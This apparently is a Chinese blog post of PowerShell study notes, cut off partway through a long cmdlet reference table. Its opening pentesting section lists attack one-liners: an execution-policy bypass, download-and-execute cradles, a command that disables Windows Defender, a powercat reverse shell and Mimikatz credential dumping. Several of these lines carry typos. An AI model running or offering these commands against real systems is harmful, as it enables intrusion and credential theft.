@@ -1,0 +1,1658 @@
+<!doctype html>
+<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>Powershell笔记 - 饱食终日，无所事事</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="饱食终日，无所事事"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="饱食终日，无所事事"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta description="Powershell中文博客 笔记"><meta property="og:type" content="blog"><meta property="og:title" content="Powershell笔记"><meta property="og:url" content="http://example.com/2019/09/07/powershell/"><meta property="og:site_name" content="饱食终日，无所事事"><meta property="og:description" content="Powershell中文博客 笔记"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="http://example.com/img/og_image.png"><meta property="article:published_time" content="2019-09-07T03:18:25.000Z"><meta property="article:modified_time" content="2020-05-07T03:51:56.140Z"><meta property="article:author" content="lll"><meta property="article:tag" content="Powershell"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="/img/og_image.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2019/09/07/powershell/"},"headline":"饱食终日，无所事事","image":["http://example.com/img/og_image.png"],"datePublished":"2019-09-07T03:18:25.000Z","dateModified":"2020-05-07T03:51:56.140Z","author":{"@type":"Person","name":"lll"},"description":"Powershell中文博客 笔记"}</script><link rel="canonical" href="http://example.com/2019/09/07/powershell/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.12.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/css/justifiedGallery.min.css"><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script><!--!--><!--!--><meta name="generator" content="Hexo 5.2.0"></head><body class="is-2-column"><nav class="navbar navbar-main"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="饱食终日，无所事事" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-8-widescreen"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2019-09-07T03:18:25.000Z" title="2019-09-07T03:18:25.000Z">2019-09-07</time>发表</span><span class="level-item"><time dateTime="2020-05-07T03:51:56.140Z" title="2020-05-07T03:51:56.140Z">2020-05-07</time>更新</span><span class="level-item"><a class="link-muted" href="/categories/Powershell/">Powershell</a></span><span class="level-item">1 小时读完 (大约8998个字)</span></div></div><h1 class="title is-3 is-size-4-mobile">Powershell笔记</h1><div class="content"><p><a target="_blank" rel="noopener" href="https://www.pstips.net/powershell-online-tutorials">Powershell中文博客</a> 笔记</p>
+<a id="more"></a>
+
+<h2 id="Powershell-安全问题"><a href="#Powershell-安全问题" class="headerlink" title="Powershell 安全问题"></a>Powershell 安全问题</h2><h3 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h3><p>各操作系统对应的Powershell版本</p>
+<table>
+<thead>
+<tr>
+<th>操作系统</th>
+<th>版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Windows 7, Windows Server 2008</td>
+<td>2.0</td>
+</tr>
+<tr>
+<td>Windows 8, Windows Server 2012</td>
+<td>3.0</td>
+</tr>
+<tr>
+<td>Windows 8.1, Windows Server 2012 R2</td>
+<td>4.0</td>
+</tr>
+<tr>
+<td>Windows 10, Windows Server 2016</td>
+<td>5.0</td>
+</tr>
+</tbody></table>
+<p>Powershell 文件的后缀名为 <code>.ps1</code>，Windows 7 以上系统默认安装，无需写到磁盘中，可以直接在内存运行，可以从其它系统下载 Powershell 脚本执行，很多杀软检测不到 Powershell 的活动，Powershell 可以用于管理活动目录。</p>
+<p>使用 Ctrl+R ，输入 powershell 调出 Powershell，或者在 cmd 下 输入 powershell 进入。cmd 下也可以直接输入 powershell 命令，格式为<code>powershell [command]</code>。</p>
+<h3 id="执行策略"><a href="#执行策略" class="headerlink" title="执行策略"></a>执行策略</h3><p>Powershell 中有一个执行策略，用于防止恶意脚本的执行，默认设置为受限，用<code>Get-ExecutionPolicy</code>命令查看执行策略，有4个策略：<code>Restricted</code>，脚本不能运行（默认）；<code>RemoteSigned</code>，本地脚本可以运行，从网上下载的脚本中拥有数字证书签名的可以运行；<code>AllSigned</code>，当脚本由受信任的发布者签名时可以运行；<code>Unrestricted</code>，所有脚本都可以运行。使用<code>Set-ExecutionPolicy [policy]</code>，可以修改执行策略。</p>
+<p>渗透测试时，需要一些方法绕过策略执行 Powershell 脚本，在 cmd 窗口下执行远程下载的 Powershell 脚本不受策略影响，都可以执行；在 powershell 窗口下受策略限制。</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># cmd</span><br><span class="line">powershell -c IEX (New-Object System.Net.Webclient).<span class="constructor">DownloadString(&#x27;<span class="params">http</span>:<span class="operator">/</span><span class="operator">/</span><span class="params">a</span>.<span class="params">com</span><span class="operator">/</span><span class="params">test</span>.<span class="params">ps1</span>&#x27;)</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="绕过本地权限执行"><a href="#绕过本地权限执行" class="headerlink" title="绕过本地权限执行"></a>绕过本地权限执行</h3><p>上传 test.ps1 到目标主机，在 cmd 环境下，在目标主机本地当前目录执行脚本</p>
+<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">cmd</span></span></span><br><span class="line">powershell -<span class="keyword">exec</span> bypass .\test.ps1</span><br></pre></td></tr></table></figure>
+
+<p>隐藏并绕过权限执行</p>
+<figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">cmd</span></span></span><br><span class="line">powershell.exe -<span class="keyword">exec</span> bypass -W hidden -nop test.ps1</span><br></pre></td></tr></table></figure>
+
+<p><code>-exec bypass</code>，ExecvtionPolicy Bypass，绕过执行安全策略，这个参数用于绕过安全保护规则。</p>
+<p><code>-w hidden</code>，WindowSytle Hidden，隐藏窗口。</p>
+<p><code>-c</code>，Command，执行 powershell 脚本。</p>
+<p><code>-nop</code>，NoProfile，控制台不加载用户的配置文件。</p>
+<p><code>NoLogo</code>，不显示版权标识。</p>
+<p><code>-noni</code>，NonInteractive，非交互模式。</p>
+<p><code>Noexit</code>，执行后不退出 shell，对于键盘记录等脚本非常重要。</p>
+<p><code>-enc base64</code>，编码为 base64。</p>
+<h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">New-Item <span class="keyword">test</span> -ItemType directory</span><br><span class="line"><span class="keyword">Remove</span>-Item <span class="keyword">test</span></span><br><span class="line">New-Item <span class="keyword">test</span>.txt -ItemType <span class="keyword">file</span></span><br><span class="line">New-Item <span class="keyword">test</span>.txt -ItemType <span class="keyword">file</span> -value <span class="string">&quot;hello&quot;</span></span><br><span class="line"><span class="keyword">Remove</span>-Item <span class="keyword">test</span>.txt</span><br><span class="line">Get-COntent <span class="keyword">test</span>.txt</span><br><span class="line"><span class="keyword">Set</span>-Content <span class="keyword">test</span>.txt -Value <span class="string">&quot;world&quot;</span></span><br><span class="line">Add-Content <span class="keyword">test</span>.txt -Value <span class="string">&quot;!&quot;</span></span><br><span class="line">Clear-Content <span class="keyword">test</span>.txt</span><br></pre></td></tr></table></figure>
+
+<p>除了 Powershell 的 动词-名词 形式的命令外，还可以使用 cmd 和 Linux 命令</p>
+<h3 id="远程下载-powershell-脚本并执行"><a href="#远程下载-powershell-脚本并执行" class="headerlink" title="远程下载 powershell 脚本并执行"></a>远程下载 powershell 脚本并执行</h3><p>需要管理员权限才能下载到 C 盘，以下命令都在 cmd 中执行</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 下载到 d:/test.exe</span><br><span class="line">powershell (<span class="built_in">new</span>-<span class="keyword">object</span> <span class="keyword">system</span>.net.webclient).downloadfile(<span class="string">&#x27;http://localhost/test.exe&#x27;</span>,<span class="string">&#x27;d:/test.exe&#x27;</span>)</span><br><span class="line"># 下载到当前目录</span><br><span class="line">powershell (<span class="built_in">new</span>-<span class="keyword">object</span> <span class="keyword">system</span>.net.webclient).downloadfile(<span class="string">&#x27;http://localhost/test.exe&#x27;</span>,<span class="string">&#x27;test.exe&#x27;</span>)</span><br><span class="line"># 下载到当前目录并执行</span><br><span class="line">powershell (<span class="built_in">new</span>-<span class="keyword">object</span> <span class="keyword">system</span>.net.webclient).dowloadfile(<span class="string">&#x27;http://localhost/test.exe&#x27;</span>,<span class="string">&#x27;test.exe&#x27;</span>);<span class="keyword">start</span>-process test.exe</span><br><span class="line"># 下载脚本并执行</span><br><span class="line">powershell -c IEX (<span class="built_in">New</span>-<span class="keyword">Object</span> <span class="keyword">System</span>.Net.Weblient).DownloadString(<span class="string">&#x27;http://localhost/test.ps1&#x27;</span>)</span><br><span class="line"># 下载脚本并带参数运行</span><br><span class="line">powershell IEX (<span class="built_in">New</span>-<span class="keyword">Object</span> <span class="keyword">System</span>.Net.Webclient).DownloadString(<span class="string">&#x27;http://localhost/test.ps1&#x27;</span>);test.ps1 -p <span class="number">8080</span> -e cmd</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用-powershell-命令"><a href="#常用-powershell-命令" class="headerlink" title="常用 powershell 命令"></a>常用 powershell 命令</h3><p>以下命令在 cmd 中执行</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 关闭 Windows Defender 防火墙（需要管理员权限）</span><br><span class="line">powershell Set-MpPreference -disablerealtimeMonitoring $<span class="literal">true</span></span><br><span class="line"># 将远程文件下载到本地</span><br><span class="line">powershell (<span class="keyword">new</span>-<span class="keyword">object</span> system.net.webclient).downloadfile(&#x27;http:<span class="comment">//localhost/test.exe&#x27;,&#x27;d:/test.exe&#x27;)</span></span><br><span class="line"># 反弹 NC shell</span><br><span class="line">powershell IEX (NEW-Object System.Net.Webclient).<span class="constructor">DownloadString(&#x27;<span class="params">https</span>:<span class="operator">/</span><span class="operator">/</span><span class="params">raw</span>.<span class="params">githubsercontent</span>.<span class="params">com</span><span class="operator">/</span><span class="params">besimorhino</span><span class="operator">/</span><span class="params">powercat</span><span class="operator">/</span><span class="params">master</span><span class="operator">/</span><span class="params">powercat</span>.<span class="params">ps1</span>&#x27;)</span>;powercat -c <span class="number">192.68</span>.<span class="number">1.4</span> -p <span class="number">8888</span> -e cmd</span><br><span class="line"># 读取明文密码（需要管理员权限）</span><br><span class="line">powershell IEX (New-Object Net.Webclient).<span class="constructor">DownloadString(&#x27;<span class="params">https</span>:<span class="operator">/</span><span class="operator">/</span><span class="params">raw</span>.<span class="params">githubsercontent</span>.<span class="params">com</span><span class="operator">/</span><span class="params">mattifestation</span><span class="operator">/</span>PowerSploit<span class="operator">/</span><span class="params">master</span><span class="operator">/</span>Exfiltration<span class="operator">/</span>Invoke-Mimikatz.<span class="params">ps1</span>&#x27;)</span>; Invoke-Mimikatz -DumpCerts</span><br><span class="line"># 读取密码 hash 值（需要管理员权限）</span><br><span class="line">powershell IEX (New-Object Net.Webclient).<span class="constructor">DownloadString(&#x27;<span class="params">https</span>:<span class="operator">/</span><span class="operator">/</span><span class="params">raw</span>.<span class="params">githubsercontent</span>.<span class="params">com</span><span class="operator">/</span><span class="params">samratashok</span><span class="operator">/</span><span class="params">nishang</span><span class="operator">/</span><span class="params">master</span><span class="operator">/</span>Gather<span class="operator">/</span>Get-PasswordHashes.<span class="params">ps1</span>&#x27;)</span>;Get-PassHashes</span><br></pre></td></tr></table></figure>
+
+<p>利用下载文件的方法同样可以反弹 MSF shell 或者 CobaltStrike shell。</p>
+<h2 id="认识Powershell"><a href="#认识Powershell" class="headerlink" title="认识Powershell"></a>认识Powershell</h2><h3 id="快捷键"><a href="#快捷键" class="headerlink" title="快捷键"></a>快捷键</h3><p>与cmd,bash等相似：</p>
+<table>
+<thead>
+<tr>
+<th>快捷键</th>
+<th>功能</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Esc</td>
+<td>清空当前命令行</td>
+</tr>
+<tr>
+<td>F2</td>
+<td>自动补充历史命令至指定字符</td>
+</tr>
+<tr>
+<td>F4</td>
+<td>删除命令行至光标右边指定字符处</td>
+</tr>
+<tr>
+<td>F7</td>
+<td>对话框显示命令行历史记录</td>
+</tr>
+<tr>
+<td>F8</td>
+<td>检索包含指定字符的命令行历史记录</td>
+</tr>
+<tr>
+<td>F9</td>
+<td>根据命令行历史记录编号选择命令，可以通过F7查看</td>
+</tr>
+<tr>
+<td>↑/↓</td>
+<td>切换命令行历史记录</td>
+</tr>
+<tr>
+<td>Ctrl+C</td>
+<td>取消正在执行的命令</td>
+</tr>
+<tr>
+<td>Ctrl+←/→</td>
+<td>在单词之间移动光标</td>
+</tr>
+<tr>
+<td>Tab</td>
+<td>自动补全命令</td>
+</tr>
+</tbody></table>
+<h3 id="管道和重定向"><a href="#管道和重定向" class="headerlink" title="管道和重定向"></a>管道和重定向</h3><p><code>|</code>把之前命令的输出作为之后命令的输入</p>
+<p>重定向把命令的输出保存到文件中，<code>&gt;</code>为覆盖，<code>&gt;&gt;</code>为追加</p>
+<h2 id="Powershell交互式"><a href="#Powershell交互式" class="headerlink" title="Powershell交互式"></a>Powershell交互式</h2><h3 id="Powershell命令集cmdlets"><a href="#Powershell命令集cmdlets" class="headerlink" title="Powershell命令集cmdlets"></a>Powershell命令集cmdlets</h3><p>cmdlets是Powershell的内部命令，cmdlet的类型名为System.Management.Automation.CmdletInfo，包含下列属性和方法：</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>MemberType</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Equals</td>
+<td>Method</td>
+<td>bool Equals(System.Object obj)</td>
+</tr>
+<tr>
+<td>GetHashCode</td>
+<td>Method</td>
+<td>int GetHashCode()</td>
+</tr>
+<tr>
+<td>GetType</td>
+<td>Method</td>
+<td>type GetType()</td>
+</tr>
+<tr>
+<td>ToString</td>
+<td>Method</td>
+<td>string ToString()</td>
+</tr>
+<tr>
+<td>CommandType</td>
+<td>Property</td>
+<td>System.Management.Automation.CommandTypes CommandType {get;}</td>
+</tr>
+<tr>
+<td>DefaultParameterSet</td>
+<td>Property</td>
+<td>System.String DefaultParameterSet {get;}</td>
+</tr>
+<tr>
+<td>Definition</td>
+<td>Property</td>
+<td>System.String Definition {get;}</td>
+</tr>
+<tr>
+<td>HelpFile</td>
+<td>Property</td>
+<td>System.String HelpFile {get;}</td>
+</tr>
+<tr>
+<td>ImplementingType</td>
+<td>Property</td>
+<td>System.Type ImplementingType {get;}</td>
+</tr>
+<tr>
+<td>Module</td>
+<td>Property</td>
+<td>System.Management.Automation.PSModuleInfo Module {get;}</td>
+</tr>
+<tr>
+<td>ModuleName</td>
+<td>Property</td>
+<td>System.String ModuleName {get;}</td>
+</tr>
+<tr>
+<td>Name</td>
+<td>Property</td>
+<td>System.String Name {get;}</td>
+</tr>
+<tr>
+<td>Noun</td>
+<td>Property</td>
+<td>System.String Noun {get;}</td>
+</tr>
+<tr>
+<td>OutputType</td>
+<td>Property</td>
+<td>System.Collections.ObjectModel.ReadOnlyCollection`1[[System.Management.Automation.PSTypeName, System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]] OutputType {get;}</td>
+</tr>
+<tr>
+<td>Parameters</td>
+<td>Property</td>
+<td>System.Collections.Generic.Dictionary`2[[System.String, mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.Management.Automation.ParameterMetadata, System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]] Parameters {get;}</td>
+</tr>
+<tr>
+<td>ParameterSets</td>
+<td>Property</td>
+<td>System.Collections.ObjectModel.ReadOnlyCollection`1[[System.Management.Automation.CommandParameterSetInfo, System.Management.Automation, Version=1.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]] ParameterSets {get;}</td>
+</tr>
+<tr>
+<td>PSSnapIn</td>
+<td>Property</td>
+<td>System.Management.Automation.PSSnapInInfo PSSnapIn {get;}</td>
+</tr>
+<tr>
+<td>Verb</td>
+<td>Property</td>
+<td>System.String Verb {get;}</td>
+</tr>
+<tr>
+<td>Visibility</td>
+<td>Property</td>
+<td>System.Management.Automation.SessionStateEntryVisibility Visibility {get;set;}</td>
+</tr>
+<tr>
+<td>DLL</td>
+<td>ScriptProperty</td>
+<td>System.Object DLL {get=$this.ImplementingType.Assembly.Location;}</td>
+</tr>
+<tr>
+<td>HelpUri</td>
+<td>ScriptProperty</td>
+<td>System.Object HelpUri {get=try { # ok to cast CommandTypes enum to HelpCategory because string/indentifier for # cmdlet,function,filter,alias,externalscript is identical. # it is ok to fail for other enum values (i.e. for Application) $helpObject = get-help -Name ($this.Name) -Category (<a href="$this.CommandType">string</a>) -ErrorAction SilentlyContinue# return first non-null uri (and try not to hit any strict mode things) if ($helpObject -eq $null) { return $null } if ($helpObject.psobject.properties[‘relatedLinks’] -eq $null) { return $null } if ($helpObject.relatedLinks.psobject.properties[‘navigationLink’] -eq $null) { return $null } $helpUri = [string]$( $helpObject.relatedLinks.navigationLink | %{ if ($<em>.psobject.properties[‘uri’] -ne $null) { $</em>.uri } } | ?{ $_ } | select -first 1 ) return $helpUri } catch {};}</td>
+</tr>
+</tbody></table>
+<p>全部cmdlets命令：</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>ModuleName</th>
+<th>Help</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Add-Computer</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135194">help</a></td>
+</tr>
+<tr>
+<td>Add-Content</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113278">help</a></td>
+</tr>
+<tr>
+<td>Add-History</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113279">help</a></td>
+</tr>
+<tr>
+<td>Add-Member</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113280">help</a></td>
+</tr>
+<tr>
+<td>Add-PSSnapin</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113281">help</a></td>
+</tr>
+<tr>
+<td>Add-Type</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135195">help</a></td>
+</tr>
+<tr>
+<td>Checkpoint-Computer</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135197">help</a></td>
+</tr>
+<tr>
+<td>Clear-Content</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113282">help</a></td>
+</tr>
+<tr>
+<td>Clear-EventLog</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135198">help</a></td>
+</tr>
+<tr>
+<td>Clear-History</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135199">help</a></td>
+</tr>
+<tr>
+<td>Clear-Item</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113283">help</a></td>
+</tr>
+<tr>
+<td>Clear-ItemProperty</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113284">help</a></td>
+</tr>
+<tr>
+<td>Clear-Variable</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113285">help</a></td>
+</tr>
+<tr>
+<td>Compare-Object</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113286">help</a></td>
+</tr>
+<tr>
+<td>Complete-Transaction</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135200">help</a></td>
+</tr>
+<tr>
+<td>Connect-WSMan</td>
+<td>Microsoft.WSMan.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkId=141437">help</a></td>
+</tr>
+<tr>
+<td>ConvertFrom-Csv</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135201">help</a></td>
+</tr>
+<tr>
+<td>ConvertFrom-SecureString</td>
+<td>Microsoft.PowerShell.Security</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113287">help</a></td>
+</tr>
+<tr>
+<td>ConvertFrom-StringData</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113288">help</a></td>
+</tr>
+<tr>
+<td>Convert-Path</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113289">help</a></td>
+</tr>
+<tr>
+<td>ConvertTo-Csv</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135203">help</a></td>
+</tr>
+<tr>
+<td>ConvertTo-Html</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113290">help</a></td>
+</tr>
+<tr>
+<td>ConvertTo-SecureString</td>
+<td>Microsoft.PowerShell.Security</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113291">help</a></td>
+</tr>
+<tr>
+<td>ConvertTo-Xml</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135204">help</a></td>
+</tr>
+<tr>
+<td>Copy-Item</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113292">help</a></td>
+</tr>
+<tr>
+<td>Copy-ItemProperty</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113293">help</a></td>
+</tr>
+<tr>
+<td>Debug-Process</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135206">help</a></td>
+</tr>
+<tr>
+<td>Disable-ComputerRestore</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135207">help</a></td>
+</tr>
+<tr>
+<td>Disable-PSBreakpoint</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113294">help</a></td>
+</tr>
+<tr>
+<td>Disable-PSSessionConfiguration</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=144299">help</a></td>
+</tr>
+<tr>
+<td>Disable-WSManCredSSP</td>
+<td>Microsoft.WSMan.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkId=141438">help</a></td>
+</tr>
+<tr>
+<td>Disconnect-WSMan</td>
+<td>Microsoft.WSMan.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkId=141439">help</a></td>
+</tr>
+<tr>
+<td>Enable-ComputerRestore</td>
+<td>Microsoft.PowerShell.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135209">help</a></td>
+</tr>
+<tr>
+<td>Enable-PSBreakpoint</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113295">help</a></td>
+</tr>
+<tr>
+<td>Enable-PSRemoting</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=144300">help</a></td>
+</tr>
+<tr>
+<td>Enable-PSSessionConfiguration</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=144301">help</a></td>
+</tr>
+<tr>
+<td>Enable-WSManCredSSP</td>
+<td>Microsoft.WSMan.Management</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkId=141442">help</a></td>
+</tr>
+<tr>
+<td>Enter-PSSession</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135210">help</a></td>
+</tr>
+<tr>
+<td>Exit-PSSession</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135212">help</a></td>
+</tr>
+<tr>
+<td>Export-Alias</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113296">help</a></td>
+</tr>
+<tr>
+<td>Export-Clixml</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113297">help</a></td>
+</tr>
+<tr>
+<td>Export-Console</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113298">help</a></td>
+</tr>
+<tr>
+<td>Export-Counter</td>
+<td>Microsoft.PowerShell.Diagnostics</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=138337">help</a></td>
+</tr>
+<tr>
+<td>Export-Csv</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113299">help</a></td>
+</tr>
+<tr>
+<td>Export-FormatData</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=144302">help</a></td>
+</tr>
+<tr>
+<td>Export-ModuleMember</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=141551">help</a></td>
+</tr>
+<tr>
+<td>Export-PSSession</td>
+<td>Microsoft.PowerShell.Utility</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=135213">help</a></td>
+</tr>
+<tr>
+<td>ForEach-Object</td>
+<td>Microsoft.PowerShell.Core</td>
+<td><a target="_blank" rel="noopener" href="http://go.microsoft.com/fwlink/?LinkID=113300">help</a></td>
+</tr>
+<tr>
+<td>Format-Custom</td>
+<td>Microsoft.PowerShell.Utility</td>
